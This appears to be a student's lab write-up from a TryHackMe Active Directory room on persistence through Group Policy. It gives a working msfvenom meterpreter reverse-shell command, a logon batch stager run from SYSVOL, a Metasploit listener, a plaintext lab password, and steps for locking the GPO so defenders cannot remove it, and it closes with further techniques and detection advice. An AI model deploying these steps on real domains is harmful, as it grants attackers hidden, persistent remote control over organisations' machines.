# LAB — Persistence Through GPOs

> [!abstract] Overview
> **Group Policy Management** centrally manages the local configuration of all domain-joined machines (restricted-group membership, firewall/AV config, startup/logon scripts). With **Domain Admin** rights you can craft a malicious GPO to deploy persistence across the entire estate — and even hide it so it becomes almost impossible to remove.

## GPO Persistence Strategies

Two common domain-wide persistence hooks:

1. **Restricted Group Membership** — centrally grant your user administrative access to **all** hosts in the domain (no reliance on harvested credentials). *(Used in the Exploiting AD room.)*
2. **Logon Script Deployment** — get a **shell callback every time a user authenticates** to a host. *(This lab.)*

We link the GPO to the **Admins OU** so we get a shell whenever an administrator (Tier 0/1/2) logs into any host — catching them while they're actively working.

## Preparation — Two Files

We need a **reverse shell executable** (callback to our listener) and a **`.bat` logon script** (stages and launches the exe).

### 1. Reverse shell binary (msfvenom)

Add your username/prefix to the filename to avoid collisions with other students:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > kali_shell.exe
```

- Payload: `windows/x64/meterpreter/reverse_tcp`
- LHOST: your lab VPN IP (here `persistad`)
- LPORT: `4445`

### 2. Logon batch script

```bash
gedit kali_script.bat
```

Contents (three commands chained with `&&` — copy binary from SYSVOL → wait 20s → execute):

```bat
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\kali_shell.exe C:\tmp\kali_shell.exe && timeout /t 20 && C:\tmp\kali_shell.exe
```

**Workflow:** GPOs are distributed domain-wide via the **`SYSVOL`** share. When an in-scope user logs in, the GPO runs the `.bat`, which copies the shell from the central `SYSVOL` scripts folder to `C:\tmp`, waits 20 seconds (lets logon settle), then runs it → reverse connection to our listener. Batch scripts are often more stable than PowerShell for this.

### 3. Copy both files to SYSVOL (SCP with Administrator creds)

```bash
scp kali_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

```bash
scp kali_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Password: `tryhackmewouldnotguess1@`

### 4. Start the Metasploit listener

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
```

## GPO Creation

RDP into `THMWRK1` and use a runas window as the Administrator:

```bash
xfreerdp /v:THMWRK1.za.tryhackme.loc /u:administrator /p:tryhackmewouldnotguess1@ /workarea /cert:ignore /smart-sizing
```

Open the Group Policy Management snap-in:

1. Open `cmd`, type **MMC**, press Enter.
2. **File → Add/Remove Snap-in...**
3. Select **Group Policy Management**, click **Add**.
4. Click **OK**.

![GPO manager](Pasted%20image%2020261013200020.png)

Create and link a GPO to the **Admins OU** (`Forest → Domains → za.tryhackme.loc → Admins`): right-click the **Admins** OU → **Create a GPO in this domain, and Link it here...** Name it e.g. `TechHacker Logon Persistence` (unique prefix avoids collisions).

![Create GPO](Pasted%20image%2020261013201911.png)

![Name GPO](Pasted%20image%2020261013201952.png)

> Right-click the policy → **Enforced** to ensure it applies even if a conflicting policy exists (helps your GPO take precedence over any blue-team policy trying to remove it).

### Configure the logon script

Right-click the policy → **Edit**:

![Edit GPO](Pasted%20image%2020261013202049.png)

In the Group Policy Management Editor:

1. **User Configuration → Policies → Windows Settings**.
2. Select **Scripts (Logon/Logoff)**.
3. Right-click **Logon → Properties**.
4. Select the **Scripts** tab.
5. **Add → Browse** and navigate to the SYSVOL scripts dir; select your `.bat`.
6. Leave parameters blank → **OK → Apply → OK**.

![Browse to script](Pasted%20image%2020261013202307.png)

Now **every** user in the Admins OU (Tier 0/1/2) triggers the script and gives us a callback when they log into any domain host. Wait for an admin login — or simulate one below.

## Hiding in Plain Sight (harden the GPO against removal)

By default all administrators can edit GPOs. Remove those permissions so the blue team can't simply delete your persistence. In MMC, select your policy → **Delegation** tab:

1. Right-click **ENTERPRISE DOMAIN CONTROLLERS** → **Edit settings, delete, modify security**.
2. Click each other group (**except Authenticated Users**) → **Remove**.
3. Click **Advanced** → remove **Creator Owner** from the permissions.

**Authenticated Users** must keep **Read** so users can read/apply the policy (needed for our logon script). To lock it down further, replace **Authenticated Users** with **Domain Computers** — computers can still read/apply, but no user can read the policy:

1. **Add** → type **Domain Computers** → **Check Names** → **OK**.
2. Select **Read** permission → **OK**.
3. Click **Authenticated Users** → **Remove**.

> [!caution] No going back
> After this you'll immediately get an error that you can no longer read your own policy. Blue team cannot remove the GPO unless they impersonate a Domain Controller's machine account — it stays until a network reset. (This can also stop your shell callback if the logon user can no longer read the script, so **test your shell first**.) Verify the GPO still applies by RDPing into one of the THMSERVERs.

## Conclusion — Additional Techniques & Mitigations

> Deploy persistence after **each** round of lateral movement / privilege escalation — don't wait for full domain compromise.

### Other persistence techniques worth knowing

- **[Skeleton Key](https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/)** — Mimikatz injects a default password that works for **any** account in the domain; normal passwords still work too, so it's hard to notice.
- **[DSRM (Directory Service Restore Mode)](https://adsecurity.org/?p=1714)** — DCs have a break-glass local admin (DSRM) account set at promotion and seldom changed. Extract it with Mimikatz for persistent admin access to DCs.
- **[Malicious SSP](https://adsecurity.org/?p=1760)** — Add Mimikatz's `mimilib` as a Security Support Provider to log all authentication credentials (optionally to a network location) as users authenticate.
- **[Computer Accounts](https://adsecurity.org/?p=2753)** — Machine account passwords rotate every ~30 days; alter the password to stop rotation and grant the machine account admin access to other hosts. Use it as a normal account — the only sign is the machine account having admin rights over other hosts (often normal in AD).

Local host persistence techniques also provide AD persistence when the hosts are domain-joined.

### Mitigations / Detection

- **Anomalous account logon events** are the most common persistence alert — any credentials breaking the tiering model may indicate persistence.
- Write specific detection rules per technique: machine account password changes, permissive ACL updates, new GPO creation (e.g. **Event ID 5136** for GPO modifications, SYSVOL file changes).
- Best defense: **protect privileged resources** — the truly dangerous techniques only unlock after an attacker gains privileged access.
- In deeply rooted cases, a **complete domain rebuild** may be required.
